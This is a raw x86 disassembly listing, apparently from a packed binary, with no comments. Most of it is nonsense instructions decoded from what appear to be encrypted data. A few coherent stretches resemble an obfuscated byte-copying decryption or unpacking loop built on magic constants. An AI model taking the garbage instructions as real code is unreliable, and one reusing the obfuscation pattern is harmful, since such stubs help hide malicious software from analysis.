  408835:	or     ebx,edx
  408837:	dec    esp
  408838:	ja     0x4088a1
  40883a:	pop    edi
  40883b:	(bad)  
  40883c:	xchg   ebx,eax
  40883d:	icebp  
  40883e:	jae    0x408862
  408840:	or     eax,0x22949c23
  408845:	call   0x631d:0xefc5cd7d
  40884c:	in     eax,0x26
  40884e:	sbb    BYTE PTR [eax],cl
  408850:	and    al,0x10
  408852:	stc    
  408853:	jmp    0x4088cc
  408855:	mov    al,0xc6
  408857:	ficom  DWORD PTR ds:0x20426b13
  40885d:	ds cld 
  40885f:	dec    eax
  408860:	(bad)  
  408862:	push   0xffffff97
  408864:	inc    ecx
  408865:	mov    eax,ds:0xda91800c
  40886a:	inc    eax
  40886b:	mov    dl,0x7d
  40886d:	dec    esi
  40886e:	test   eax,0x94868257
  408873:	ss jo  0x40880f
  408876:	les    eax,FWORD PTR [eax-0x22]
  408879:	push   edx
  40887a:	mov    esi,0x320ee839
  40887f:	jmp    0x3095:0x875056d9
  408886:	sbb    eax,0x722c2be2
  40888b:	ja     0x408863
  40888d:	out    0xf8,al
  40888f:	aaa    
  408890:	sti    
  408891:	pop    eax
  408892:	je     0x40884e
  408894:	sbb    eax,0x8a7e5fdf
  408899:	jg     0x4088a2
  40889b:	mov    esp,gs
  40889d:	lea    ebx,[edi+esi*8]
  4088a0:	mov    WORD PTR [ebx],fs
  4088a2:	or     bh,bl
  4088a4:	nop
  4088a5:	sbb    BYTE PTR [edx+ebp*1],bh
  4088a8:	pop    ds
  4088a9:	xor    ecx,DWORD PTR [ecx-0x47]
  4088ac:	lods   eax,DWORD PTR ds:[esi]
  4088ad:	mov    esp,?
  4088af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088b0:	div    edi
  4088b2:	mov    edx,DWORD PTR ds:0x4222a8
  4088b8:	mov    edx,DWORD PTR [edx+0x1cc]
  4088be:	sub    edx,eax
  4088c0:	mov    al,BYTE PTR [esi]
  4088c2:	mov    BYTE PTR [edx+ecx*1-0x52],al
  4088c6:	mov    eax,DWORD PTR [ebp-0x14]
  4088c9:	mov    edx,DWORD PTR [ebp-0x18]
  4088cc:	imul   eax,eax,0xe6d
  4088d2:	and    eax,0x2d9a
  4088d7:	xor    eax,edx
  4088d9:	add    eax,0x39d
  4088de:	xor    eax,0x2a59
  4088e3:	add    ecx,eax
  4088e5:	mov    eax,ds:0x4226a0
  4088ea:	xor    edx,edx
  4088ec:	xor    eax,0x2eb8
  4088f1:	pop    esi
  4088f2:	jmp    0x408c26
  4088f7:	ja     0x4088e8
  4088f9:	scas   eax,DWORD PTR es:[edi]
  4088fa:	test   DWORD PTR [edi+0x3c3d7d85],esi
  408900:	fldenv [ebx+0x45]
  408903:	mov    ss,WORD PTR [ebp-0x79]
  408906:	das    
  408907:	sti    
  408908:	fs mov ebx,0xbbc5e5bb
  40890e:	mov    ebx,0x58f929c3
  408913:	inc    esp
  408914:	push   edi
  408915:	add    al,BYTE PTR [ebp-0x7e]
  408918:	push   edi
  408919:	cmp    eax,0x294a9754
  40891e:	ret    
  40891f:	(bad)  
  408920:	out    0xf9,eax
  408922:	pop    ecx
  408923:	push   edi
  408924:	vpand  ymm0,ymm5,YMMWORD PTR [eax]
  408928:	mov    eax,ds:0x6b9afcda
  40892d:	inc    ecx
  40892e:	adc    ah,BYTE PTR [edi+0x48]
  408931:	sbb    ecx,DWORD PTR [esi]
  408933:	xor    ch,BYTE PTR [ebx+eax*1+0x6dacb307]
  40893a:	jge    0x408969
  40893c:	sub    al,0xa2
  40893e:	mov    cs,WORD PTR [esi+0x4c]
  408941:	ret    0x8be6
  408944:	icebp  
  408945:	imul   ebx,eax,0x37c5f397
  40894b:	ins    DWORD PTR es:[edi],dx
  40894c:	dec    esi
  40894d:	shr    DWORD PTR [ebp-0x19e89319],cl
  408953:	adc    al,0x3d
  408955:	and    DWORD PTR [esp+esi*8+0x33c87871],ecx
  40895c:	mul    BYTE PTR [ecx+0x64]
  40895f:	or     BYTE PTR [eax+0x68],bl
  408962:	popf   
  408963:	loop   0x408970
  408965:	or     BYTE PTR [ebp+0x6a],al
  408968:	mov    DWORD PTR [bx+0x58f5],edi
  40896d:	bswap  ebp
  40896f:	fs mov edx,0xad237f54
  408975:	js     0x4089be
  408977:	mov    ebx,0x79aa7f7f
  40897c:	jo     0x4089cf
  40897e:	(bad)  
  40897f:	xchg   ebp,eax
  408980:	push   ebx
  408981:	xchg   edi,eax
  408982:	sub    ebp,esp
  408984:	xchg   ebx,eax
  408985:	leave  
  408986:	dec    edi
  408987:	shl    BYTE PTR [esi+eax*2-0x5796146e],0xd6
  40898f:	xor    BYTE PTR [edx-0x7917857],bl
  408995:	sar    DWORD PTR [eax+eax*4-0x28],0xb8
  40899a:	shl    esp,1
  40899c:	sbb    ah,BYTE PTR [edi-0x2180c28b]
  4089a2:	ins    BYTE PTR es:[edi],dx
  4089a3:	and    edi,DWORD PTR [eax]
  4089a5:	lahf   
  4089a6:	aam    0xee
  4089a8:	jle    0x408971
  4089aa:	bound  edi,QWORD PTR [ebx-0x42]
  4089ad:	call   0x74a8:0x7a6f26dd
  4089b4:	dec    ebx
  4089b5:	mov    eax,DWORD PTR [esi+0x78e47e00]
  4089bb:	jmp    0x408971
  4089bd:	sub    al,0x60
  4089bf:	cdq    
  4089c0:	xchg   bh,ch
  4089c2:	sub    esp,DWORD PTR ds:0x8c469101
  4089c8:	sub    BYTE PTR [eax-0x23b5e177],0x8a
  4089cf:	(bad)  
  4089d0:	mov    esp,0x5d327c59
  4089d5:	add    eax,0xd97d570d
  4089da:	cld    
  4089db:	clc    
  4089dc:	cmp    DWORD PTR [ecx+0x28e6ad2d],0x46ab4ace
  4089e6:	and    ebp,ebp
  4089e8:	mov    edi,0xf9615304
  4089ed:	adc    cl,BYTE PTR [esi]
  4089ef:	mov    ebx,0x50a399a6
  4089f4:	mov    dh,BYTE PTR [edi]
  4089f6:	mov    ds,edx
  4089f8:	push   cs
  4089f9:	ss cs dec eax
  4089fc:	mov    ch,0xac
  4089fe:	jo     0x40898d
  408a00:	jle    0x4089a7
  408a02:	xchg   DWORD PTR [ebx],esp
  408a04:	adc    BYTE PTR [ecx+0xa],cl
  408a07:	adc    eax,0xd1491b15
  408a0c:	rcr    DWORD PTR [ebx-0x5af689b8],cl
  408a12:	cmp    al,0xab
  408a14:	xchg   ebx,eax
  408a15:	jne    0x408a70
  408a17:	pop    ds
  408a18:	(bad)  
  408a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a1a:	out    dx,al
  408a1b:	iret   
  408a1c:	mov    al,0x88
  408a1e:	sbb    esp,DWORD PTR [edx+0x6654f135]
  408a24:	call   0x40db26b9
  408a29:	adc    eax,0x2c15eb0e
  408a2e:	and    ecx,DWORD PTR [eax+0x1c1b541f]
  408a34:	sub    eax,0xa4c9738f
  408a39:	xor    esi,DWORD PTR [eax+0x6d]
  408a3c:	cmp    esi,DWORD PTR [esi+eax*1]
  408a3f:	ins    DWORD PTR es:[edi],dx
  408a40:	fistp  QWORD PTR [ebx+0x42]
  408a43:	cld    
  408a44:	imul   esp,DWORD PTR [eax-0x2fab9ba4],0x72ae2500
  408a4e:	jmp    DWORD PTR [esi+0x49202ec8]
  408a54:	sti    
  408a55:	int    0x45
  408a57:	jmp    0x66ba:0xf4932126
  408a5e:	(bad)  
  408a5f:	mov    dl,0x2f
  408a61:	and    DWORD PTR [eax],edi
  408a63:	dec    ebp
  408a64:	or     BYTE PTR [eax-0x5c],bh
  408a67:	mov    esi,0x149a5513
  408a6c:	dec    esi
  408a6d:	add    BYTE PTR [edx+0x420fd94d],0xaa
  408a74:	lods   eax,DWORD PTR ds:[esi]
  408a75:	xchg   ebx,eax
  408a76:	mov    ebx,edx
  408a78:	mov    edi,0x471d1876
  408a7d:	(bad)  
  408a7e:	push   ds
  408a7f:	sub    edx,DWORD PTR [edi+0x16c6b689]
  408a85:	ds push ebp
  408a87:	call   0xa2afdfca
  408a8c:	dec    esp
  408a8d:	fidiv  DWORD PTR [ebp-0x125d17bc]
  408a93:	push   ebp
  408a94:	inc    ebx
  408a95:	lahf   
  408a96:	nop
  408a97:	outs   dx,DWORD PTR ds:[esi]
  408a98:	xchg   edx,eax
  408a99:	das    
  408a9a:	fmul   DWORD PTR [edx+edx*4]
  408a9d:	lock sahf 
  408a9f:	lock adc BYTE PTR [ebp+0x3b5fc031],bl
  408aa6:	push   es
  408aa7:	cmc    
  408aa8:	loopne 0x408a42
  408aaa:	ror    DWORD PTR fs:[edx],0x3d
  408aae:	sub    eax,0xb91146c7
  408ab3:	mov    esp,DWORD PTR [ebx+eiz*4]
  408ab6:	out    0xf5,al
  408ab8:	mov    ecx,0x25554fb3
  408abd:	pop    ds
  408abe:	mov    ah,dh
  408ac0:	mov    esp,0x8259cb37
  408ac5:	dec    esi
  408ac6:	xchg   edx,eax
  408ac7:	not    DWORD PTR [edi-0x6b]
  408aca:	das    
  408acb:	sub    ebp,edi
  408acd:	push   eax
  408ace:	outs   dx,DWORD PTR ds:[esi]
  408acf:	je     0x408b3f
  408ad1:	into   
  408ad2:	or     esi,esp
  408ad4:	jmp    0x408ad6
  408ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad7:	add    dh,BYTE PTR [ecx]
  408ad9:	xchg   BYTE PTR [ebx],dl
  408adb:	sub    esp,esp
  408add:	ret    0xe0c7
  408ae0:	push   edx
  408ae1:	push   edx
  408ae2:	or     esi,ebp
  408ae4:	popa   
  408ae5:	or     DWORD PTR [edi+0x7f],ebp
  408ae8:	inc    ebx
  408ae9:	jmp    FWORD PTR [esi+0x6681b474]
  408aef:	fsubr  DWORD PTR [eax+ebx*2]
  408af2:	mov    cl,0xe4
  408af4:	and    cl,dl
  408af6:	jle    0x408b50
  408af8:	pop    ecx
  408af9:	clc    
  408afa:	cmc    
  408afb:	xor    BYTE PTR [edi+eax*2-0x2e999e28],cl
  408b02:	xchg   edi,eax
  408b03:	add    DWORD PTR [edi-0x47],eax
  408b06:	sub    al,BYTE PTR [edi]
  408b08:	das    
  408b09:	or     ch,dl
  408b0b:	sti    
  408b0c:	call   FWORD PTR [edi]
  408b0e:	mov    es,WORD PTR [eax-0x15]
  408b11:	xchg   edi,eax
  408b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b13:	mov    esp,DWORD PTR [ecx-0x3b754aee]
  408b19:	call   0x607c:0x37bcca71
  408b20:	cli    
  408b21:	xor    edx,ecx
  408b23:	mov    ch,0xb1
  408b25:	imul   esp,edx,0x9048bf44
  408b2b:	pop    ds
  408b2c:	add    DWORD PTR [ebp+edi*4+0x47260f1a],ecx
  408b33:	daa    
  408b34:	scas   eax,DWORD PTR es:[edi]
  408b35:	sahf   
  408b36:	push   edx
  408b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b38:	cmp    DWORD PTR [ebx+0x7f],0x42433c66
  408b3f:	mov    ah,0x2e
  408b41:	sub    dl,dl
  408b43:	push   ebp
  408b44:	sbb    edi,DWORD PTR [edx-0x41]
  408b47:	jno    0x408b56
  408b49:	repnz add esp,0x42bfe06d
  408b50:	cmp    ebx,DWORD PTR [esi+0x4e]
  408b53:	sbb    BYTE PTR [ecx+esi*1],0xfd
  408b57:	adc    al,BYTE PTR [ebx-0x3a]
  408b5a:	aas    
  408b5b:	mov    ah,0x1c
  408b5d:	fisubr WORD PTR [eax+ebp*4-0x2fe81046]
  408b64:	gs adc esi,eax
  408b67:	jg     0x408b5f
  408b69:	(bad)  
  408b6a:	push   ebp
  408b6b:	ss ins DWORD PTR es:[edi],dx
  408b6d:	dec    ebx
  408b6e:	jmp    0x3cac:0xfb1763b4
  408b75:	fidiv  WORD PTR [eax]
  408b77:	push   0x46
  408b79:	repnz setns BYTE PTR [ebp+0x3dca9e3d]
  408b81:	push   ebx
  408b82:	fs scas eax,DWORD PTR es:[edi]
  408b84:	cli    
  408b85:	adc    ecx,DWORD PTR [ecx+0x6e]
  408b88:	or     esi,DWORD PTR [ebx+0xc]
  408b8b:	mov    al,0x9
  408b8d:	pop    esp
  408b8e:	add    eax,DWORD PTR [edx+0x26472732]
  408b94:	mov    ebx,0x5fbf0241
  408b99:	mov    ecx,0x864c4abe
  408b9e:	mov    ebp,ebx
  408ba0:	mov    edi,0x45161b65
  408ba5:	jle    0x408c05
  408ba7:	sub    al,0x97
  408ba9:	add    cl,ch
  408bab:	ficom  WORD PTR [edx]
  408bad:	add    eax,0x709848ae
  408bb2:	pop    edi
  408bb3:	and    eax,0x69dc7859
  408bb8:	(bad)  
  408bb9:	loopne 0x408b47
  408bbb:	push   edx
  408bbc:	push   ecx
  408bbd:	test   eax,0xa7809792
  408bc2:	or     BYTE PTR [ecx-0x4dabeed],dh
  408bc8:	(bad)  
  408bca:	fild   WORD PTR [edx*1-0x1cf1832]
  408bd1:	(bad)  
  408bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bd3:	pop    ds
  408bd4:	aam    0x5
  408bd6:	(bad)  
  408bd7:	in     al,dx
  408bd8:	in     eax,dx
  408bd9:	lods   al,BYTE PTR ds:[esi]
  408bda:	push   ss
  408bdb:	fs inc ecx
  408bdd:	xchg   edx,eax
  408bde:	add    DWORD PTR [edx+0xb],0x6c
  408be2:	inc    ecx
  408be3:	xchg   edx,eax
  408be4:	pop    es
  408be5:	mov    edx,0x6ae25886
  408bea:	rcl    esi,1
  408bec:	call   0x17b7:0x2a09a4da
  408bf3:	pop    ebx
  408bf4:	adc    bh,dl
  408bf6:	fistp  WORD PTR [ebp+0x72]
  408bf9:	aas    
  408bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bfb:	cli    
  408bfc:	push   ebx
  408bfd:	push   ebx
  408bfe:	pop    ss
  408bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c01:	pop    ecx
  408c02:	xchg   DWORD PTR [eax],ecx
  408c04:	xor    DWORD PTR [ebp-0x39],esp
  408c07:	inc    ebp
  408c08:	or     al,0xb6
  408c0a:	ins    DWORD PTR es:[edi],dx
  408c0b:	mov    edi,0x333bff22
  408c10:	inc    ebx
  408c11:	icebp  
  408c12:	ret    
  408c13:	mov    bl,0x12
  408c15:	mov    eax,0xad24a9ff
  408c1a:	inc    ecx
  408c1b:	xchg   ebx,eax
  408c1c:	test   eax,0x12b53960
  408c21:	popa   
  408c22:	lock daa 
  408c24:	pop    ecx
  408c25:	pop    esp
  408c26:	div    esi
  408c28:	mov    edx,DWORD PTR [ebp-0x1c]
  408c2b:	shr    eax,1
  408c2d:	imul   edx,eax
  408c30:	sub    edx,0x43ad
  408c36:	xor    edx,0x1979672
  408c3c:	cmp    ecx,edx
  408c3e:	jb     0x40851e
  408c44:	mov    DWORD PTR [ebp-0x18],0x21f8
  408c4b:	mov    DWORD PTR [ebp-0x1c],0x556c
  408c52:	mov    DWORD PTR [ebp+0x8],0x2f33
  408c59:	mov    DWORD PTR [ebp-0x8],0x2126
  408c60:	mov    DWORD PTR [ebp-0xc],0x1ed3
  408c67:	mov    ecx,DWORD PTR ds:0x4226a8
  408c6d:	mov    eax,ds:0x4226b0
  408c72:	or     ecx,eax
  408c74:	mov    eax,ds:0x4226ac
  408c79:	or     eax,ecx
  408c7b:	mov    ecx,DWORD PTR [ebp-0x1c]
  408c7e:	sub    eax,ecx
  408c80:	mov    ecx,DWORD PTR [ebp-0x18]
  408c83:	add    eax,0x58ea
  408c88:	or     ecx,eax
  408c8a:	mov    eax,DWORD PTR [ebp+0x8]
  408c8d:	mov    esi,DWORD PTR ds:0x4226b4
  408c93:	add    eax,0x20ae
  408c98:	and    eax,0x55aa
  408c9d:	xor    edx,edx
  408c9f:	div    esi
  408ca1:	mov    esi,0x69d0
  408ca6:	xor    ecx,0xe1f4
  408cac:	xor    eax,0x4c2d
  408cb1:	or     eax,0x23d2
  408cb6:	xor    eax,esi
  408cb8:	cmp    ecx,eax
  408cba:	jae    0x40972f
  408cc0:	push   ebx
  408cc1:	mov    DWORD PTR [ebp-0x1c],0x5f46
  408cc8:	xor    edx,edx
  408cca:	mov    DWORD PTR [ebp-0x10],0x10
  408cd1:	mov    DWORD PTR [ebp-0x14],0x55b4
  408cd8:	mov    DWORD PTR [ebp-0x18],0x1
  408cdf:	mov    edi,DWORD PTR ds:0x4226bc
  408ce5:	mov    eax,0x2af0
  408cea:	div    edi
  408cec:	mov    edx,DWORD PTR [ebp-0x1c]
  408cef:	mov    edi,0x37ee
  408cf4:	mov    ebx,DWORD PTR [ebp-0x18]
  408cf7:	sub    eax,edx
  408cf9:	add    eax,0x4e84
  408cfe:	imul   eax,eax,0x7648
  408d04:	xor    edx,edx
  408d06:	jmp    0x40903a
  408d0b:	jmp    0x408cd6
  408d0d:	fdivr  st,st(1)
  408d0f:	stc    
  408d10:	stc    
  408d11:	jmp    0x408cdb
  408d13:	mov    edi,0xf92ff76c
  408d18:	sbb    eax,esp
  408d1a:	cmp    esp,DWORD PTR ds:0xe5bbbb66
  408d20:	lds    edi,FWORD PTR [ebx-0x34918e45]
  408d26:	add    esp,DWORD PTR [edx+0x4041b020]
  408d2c:	xor    eax,0x599cc7e9
  408d31:	push   edx
  408d32:	inc    ebx
  408d33:	push   eax
  408d34:	inc    edx
  408d35:	cdq    
  408d36:	mov    bl,0x50
  408d38:	sti    
  408d39:	std    
  408d3a:	xchg   DWORD PTR [ecx+0x11],esi
  408d3d:	xor    BYTE PTR [eax+0x5f6144f7],dl
  408d43:	and    DWORD PTR [ebx+0x37],ebp
  408d46:	push   ecx
  408d47:	ja     0x408cee
  408d49:	pop    ecx
  408d4a:	aam    0xd6
  408d4c:	or     edi,DWORD PTR [edi-0x4]
  408d4f:	out    0x8e,eax
  408d51:	add    al,0x5b
  408d53:	ss dec edi
  408d55:	pop    eax
  408d56:	adc    esp,eax
  408d58:	int3   
  408d59:	jle    0x408d36
  408d5b:	lea    eax,[edx+0x30653575]
  408d61:	in     al,0xa3
  408d63:	fiadd  DWORD PTR [ecx]
  408d65:	call   0x8abc:0x1abf9b13
  408d6c:	lock pop ss
  408d6e:	add    ah,BYTE PTR [ebx-0x3a]
  408d71:	mov    DWORD PTR [esi],ebp
  408d73:	inc    edx
  408d74:	cmp    DWORD PTR [edi+eax*4+0x56],ebp
  408d78:	adc    DWORD PTR [esi+0x6c],eax
  408d7b:	ud1    ebp,DWORD PTR [eax+0x3]
  408d7f:	sbb    ebx,DWORD PTR gs:[edx-0xcd429f9]
  408d86:	mov    WORD PTR ss:[ebx-0x3f],gs
  408d8a:	imul   esi,DWORD PTR [edx+0x39],0x19
  408d8e:	popa   
  408d8f:	or     cl,BYTE PTR [ebx-0x65]
  408d92:	mov    ebp,0x78141961
  408d97:	xor    cl,BYTE PTR [ebx-0x75]
  408d9a:	sbb    eax,0xd66e0700
  408d9f:	loopne 0x408d8d
  408da1:	push   ss
  408da2:	loopne 0x408de5
  408da4:	add    DWORD PTR [ebx+0x2f0d7bd1],edi
  408daa:	inc    ebx
  408dab:	and    eax,0xff073ae1
  408db0:	shl    BYTE PTR [esi+0x41],0xb6
  408db4:	jl     0x408df7
  408db6:	mov    ds:0xbedf03e9,al
  408dbb:	hlt    
  408dbc:	jp     0x408db8
  408dbe:	push   edi
  408dbf:	mov    ?,WORD PTR [ebx+ebp*8]
  408dc2:	outs   dx,DWORD PTR ds:[esi]
  408dc3:	or     DWORD PTR [ecx],ecx
  408dc5:	dec    edx
  408dc6:	push   ss
  408dc7:	sub    eax,0x4a413d31
  408dcc:	push   ss
  408dcd:	mov    DWORD PTR [ecx+0x33491844],ebx
  408dd3:	xor    eax,0xeb6082d5
  408dd8:	std    
  408dd9:	adc    cl,BYTE PTR [edi-0x13fec4d5]
  408ddf:	sahf   
  408de0:	outs   dx,DWORD PTR ds:[esi]
  408de1:	dec    esi
  408de2:	ret    
  408de3:	imul   ecx,DWORD PTR [edx],0xa037dc91
  408de9:	je     0x408d6f
  408deb:	sub    ch,0x78
  408dee:	ficom  WORD PTR [edx+0x5e]
  408df1:	clc    
  408df2:	dec    esp
  408df3:	adc    ecx,DWORD PTR [esi]
  408df5:	js     0x408e48
  408df7:	jmp    0x8d61:0x33bf5040
  408dfe:	mov    esi,0x2979b411
  408e03:	mov    dl,0x6
  408e05:	shl    DWORD PTR [eax+0x7b],1
  408e08:	adc    eax,0x96a3d6c4
  408e0d:	in     eax,dx
  408e0e:	retf   0x752b
  408e11:	out    0x1d,eax
  408e13:	(bad)  
  408e14:	fild   WORD PTR [edx+0x4d863438]
  408e1a:	enter  0xd56f,0x12
  408e1e:	push   0xffffffc3
  408e20:	std    
  408e21:	(bad)  
  408e22:	sbb    eax,0xc6315d42
  408e27:	popa   
  408e28:	loopne 0x408dd6
  408e2a:	mov    bh,0xf5
  408e2c:	add    eax,0xd34a1995
  408e31:	enter  0x30b9,0x6f
  408e35:	pop    edx
  408e36:	inc    ecx
  408e37:	loopne 0x408e1b
  408e39:	call   0x524d6f55
  408e3e:	ficom  DWORD PTR [ecx+0x64bd1b64]
  408e44:	ja     0x408e1c
  408e46:	fld    TBYTE PTR [edi+0x6d3b7fe4]
  408e4c:	pop    eax
  408e4d:	shl    BYTE PTR [esi],0x7d
  408e50:	rcr    DWORD PTR [esp+ebx*1+0x54dc07e4],0x85
  408e58:	sub    ah,BYTE PTR [eax]
  408e5a:	jne    0x408e5b
  408e5c:	mov    BYTE PTR [esi],0xb7
  408e5f:	jne    0x408ed7
  408e61:	mov    ebp,0x4f49bfa8
  408e66:	ins    BYTE PTR es:[edi],dx
  408e67:	inc    ebx
  408e68:	repz and eax,0xdbee19eb
  408e6e:	stos   DWORD PTR es:[edi],eax
  408e6f:	push   ss
  408e70:	cmp    BYTE PTR [edx+eax*8+0x7b],cl
  408e74:	cs mov edi,0xc5f9bfee
  408e7a:	xchg   edx,eax
  408e7b:	fisttp QWORD PTR [ebx+edi*4-0x502fcd1e]
  408e82:	dec    edi
  408e83:	fdivr  st(3),st
  408e85:	in     eax,0x34
  408e87:	jmp    0xcf2e4e0a
  408e8c:	cdq    
  408e8d:	je     0x408e45
  408e8f:	retf   
  408e90:	push   es
  408e91:	jmp    0x2abc5f88
  408e96:	pop    edi
  408e97:	(bad)  
  408e99:	cmp    eax,0xcb12d88a
  408e9e:	pop    edi
  408e9f:	dec    ebp
  408ea0:	inc    esp
  408ea1:	imul   ebx,ebp,0xffffff9b
  408ea4:	adc    al,0x55
  408ea6:	clc    
  408ea7:	outs   dx,BYTE PTR ds:[esi]
  408ea8:	mov    cl,0xa0
  408eaa:	push   ebx
  408eab:	or     al,0x45
  408ead:	loope  0x408e8a
  408eaf:	repz lea edi,[esi]
  408eb2:	push   ss
  408eb3:	sbb    esp,DWORD PTR [edi+0x54797845]
  408eb9:	(bad)  
  408eba:	pop    ebx
  408ebb:	cmc    
  408ebc:	adc    al,BYTE PTR [eax]
  408ebe:	daa    
  408ebf:	or     DWORD PTR [esp+edx*8],edi
  408ec2:	sbb    ebp,ecx
  408ec4:	xchg   BYTE PTR cs:[ebx+0x74],ah
  408ec8:	sub    cl,BYTE PTR [esi]
  408eca:	jle    0x408ee7
  408ecc:	mov    ah,0x52
  408ece:	cmc    
  408ecf:	out    0x5d,al
  408ed1:	iret   
  408ed2:	mov    edx,0xeaeee404
  408ed7:	push   edx
  408ed8:	pop    ebp
  408ed9:	test   eax,0x5d226302
  408ede:	nop
  408edf:	sub    eax,0xc5644ce
  408ee4:	mov    BYTE PTR [ecx-0xf],cl
  408ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee8:	outs   dx,DWORD PTR ds:[esi]
  408ee9:	scas   al,BYTE PTR es:[edi]
  408eea:	ins    BYTE PTR es:[edi],dx
  408eeb:	add    eax,0x3b5c6d43
  408ef0:	dec    eax
  408ef1:	pop    es
  408ef2:	push   ds
  408ef3:	aam    0x5a
  408ef5:	dec    ebp
  408ef6:	push   esi
  408ef7:	lahf   
  408ef8:	dec    ebx
  408ef9:	clc    
  408efa:	add    ecx,edi
  408efc:	aas    
  408efd:	and    ebx,DWORD PTR [edx+ebx*1]
  408f00:	stc    
  408f01:	xchg   ebx,esp
  408f03:	stos   BYTE PTR es:[edi],al
  408f04:	ficom  WORD PTR [edx-0x6a]
  408f07:	inc    edx
  408f08:	fsub   DWORD PTR [edi]
  408f0a:	sbb    ecx,DWORD PTR [esi-0x73d88e7f]
  408f10:	popf   
  408f11:	bound  edi,QWORD PTR ds:0xed9992ea
  408f17:	jecxz  0x408f85
  408f19:	and    BYTE PTR [esi-0x59],dh
  408f1c:	mov    es,WORD PTR [ecx+0xb5f07b3]
  408f22:	lock pop esp
  408f24:	push   esi
  408f25:	lahf   
  408f26:	ss pop ss
  408f28:	dec    ecx
  408f29:	add    BYTE PTR [ebx],bl
  408f2b:	call   0x5920:0xe216428a
  408f32:	fs xchg esp,eax
  408f34:	sub    al,0x58
  408f36:	pusha  
  408f37:	dec    ecx
  408f38:	ss stos BYTE PTR es:[edi],al
  408f3a:	and    DWORD PTR [eax-0x1bbd120f],0x1ed2ce45
  408f44:	mov    ah,0x45
  408f46:	out    0xab,al
  408f48:	xchg   ecx,eax
  408f49:	mov    ebx,DWORD PTR [ebx+ecx*8+0x61]
  408f4d:	ja     0x408f93
  408f4f:	jns    0x408f46
  408f51:	xchg   ecx,eax
  408f52:	dec    edx
  408f53:	mov    ah,0xd3
  408f55:	jne    0x408fcd
  408f57:	popa   
  408f58:	fstp   TBYTE PTR cs:[edi+0x27]
  408f5c:	cmp    DWORD PTR ds:0xcb2bc3d1,eax
  408f62:	jae    0x408f1a
  408f64:	ret    0x81aa
  408f67:	pusha  
  408f68:	in     eax,dx
  408f69:	push   ecx
  408f6a:	test   BYTE PTR [ebx],bh
  408f6c:	outs   dx,BYTE PTR ds:[esi]
  408f6d:	push   0x67f6a1d8
  408f72:	cli    
  408f73:	push   esi
  408f74:	in     eax,dx
  408f75:	inc    edi
  408f76:	push   ds
  408f77:	xchg   ecx,eax
  408f78:	loope  0x408ff5
  408f7a:	and    edi,DWORD PTR [ecx-0xc]
  408f7d:	cmc    
  408f7e:	test   DWORD PTR [ebx],edi
  408f80:	(bad)  
  408f81:	neg    BYTE PTR [edi+0x41]
  408f84:	retf   
  408f85:	fsub   QWORD PTR [edx+0x6b]
  408f88:	sub    eax,0xf6ec6793
  408f8d:	pop    ebp
  408f8e:	cmp    eax,0x2440ecde
  408f93:	dec    ecx
  408f94:	xor    DWORD PTR [ebx+0x6e7cd4c7],ebx
  408f9a:	sahf   
  408f9b:	or     al,BYTE PTR [edx]
  408f9d:	or     bl,BYTE PTR [ecx]
  408f9f:	mov    ch,0x2f
  408fa1:	retf   
  408fa2:	cmp    al,BYTE PTR [edi-0x62169fd9]
  408fa8:	mov    eax,0xf5de108e
  408fad:	sbb    eax,0xd7d83b3c
  408fb2:	lods   eax,DWORD PTR ds:[esi]
  408fb3:	xor    DWORD PTR [esi+0x7481e713],ebx
  408fb9:	jg     0x408fc2
  408fbb:	ror    BYTE PTR [esi],1
  408fbd:	js     0x408fa4
  408fbf:	daa    
  408fc0:	div    esp
  408fc2:	icebp  
  408fc3:	dec    ebp
  408fc4:	pushf  
  408fc5:	(bad)  
  408fc6:	imul   ebx,DWORD PTR [ebx+esi*2+0x72be72],0xdb5f7558
  408fd1:	in     al,dx
  408fd2:	clc    
  408fd3:	add    dh,BYTE PTR cs:[ebx]
  408fd6:	dec    ebx
  408fd7:	mov    dl,ch
  408fd9:	mov    esi,0x6dbe92e1
  408fde:	sub    DWORD PTR [ebp+0x3],ebp
  408fe1:	rol    al,1
  408fe3:	xchg   DWORD PTR [edi-0x24bd6bb1],ecx
  408fe9:	lahf   
  408fea:	or     dl,BYTE PTR [edx+0x5e81419]
  408ff0:	or     DWORD PTR [edx],0xffffff9d
  408ff3:	out    dx,eax
  408ff4:	mov    cl,BYTE PTR [ecx+ebx*2]
  408ff7:	retf   0x79e7
  408ffa:	mov    eax,0xb7d61f68
  408fff:	and    dl,BYTE PTR [ecx]
  409001:	add    cl,BYTE PTR es:[ebx+eiz*8-0x1c]
  409006:	sbb    ch,ah
  409008:	je     0x409019
  40900a:	add    esp,DWORD PTR [edx]
  40900c:	daa    
  40900d:	cli    
  40900e:	sbb    edx,DWORD PTR [esp+edi*2-0x41]
  409012:	push   es
  409013:	sub    esp,ebx
  409015:	(bad)  
  409016:	fist   DWORD PTR [eax+edx*4]
  40901a:	mov    ah,0xe1
  40901c:	push   0xffffff83
  40901e:	or     ch,BYTE PTR [bx+di-0x6e34]
  409023:	inc    ebx
  409024:	jnp    0x40909d
  409026:	push   ss
  409027:	(bad)  
  409028:	jle    0x40905a
  40902a:	das    
  40902b:	fbld   TBYTE PTR [ecx+0x7186c190]
  409031:	inc    eax
  409032:	aad    0xd8
  409034:	ror    BYTE PTR [ebp+0xa],0x51
  409038:	adc    eax,0xd233f7f7
  40903e:	mov    edi,ecx
  409040:	xor    eax,0x7556
  409045:	sub    edi,eax
  409047:	mov    eax,DWORD PTR [ebp-0x14]
  40904a:	div    ebx
  40904c:	mov    ebx,DWORD PTR [ebp-0x10]
  40904f:	xor    edx,edx
  409051:	div    ebx
  409053:	mov    edx,DWORD PTR ds:0x4226c0
  409059:	imul   eax,edx
  40905c:	mov    edx,DWORD PTR ds:0x4222a8
  409062:	mov    edx,DWORD PTR [edx+0x1d0]
  409068:	sub    edx,eax
  40906a:	mov    eax,DWORD PTR [ebp+0xc]
  40906d:	mov    al,BYTE PTR [edi+eax*1]
  409070:	mov    BYTE PTR [edx+ecx*1+0x299538d],al
  409077:	mov    eax,DWORD PTR [ebp-0xc]
  40907a:	mov    edx,DWORD PTR ds:0x4226b8
